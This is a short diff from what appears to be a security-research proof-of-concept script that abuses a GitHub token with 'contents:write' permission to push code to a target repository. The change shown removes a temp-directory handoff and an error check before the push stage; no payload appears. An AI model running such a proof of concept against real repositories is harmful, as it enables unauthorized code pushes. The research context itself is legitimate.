@@ -130,19 +130,8 @@ With \`contents:write\`, an attacker can:
     }
     console.log("");
 
-    // Store tempDir for Stage 4
-    global.pocTempDir = tempDir;
-
     // Stage 4: Push to TARGET Repository
     console.log("[Stage 4] Pushing to Target Repository");
-    const tempDir = global.pocTempDir;
-    if (!tempDir) {
-        console.log("  ! No temp dir - Stage 3 failed");
-        console.log("");
-        console.log("[Complete] Security research PoC finished (error)");
-        console.log("");
-        return;
-    }
 
     try {
         // Create new branch and push from the clean clone
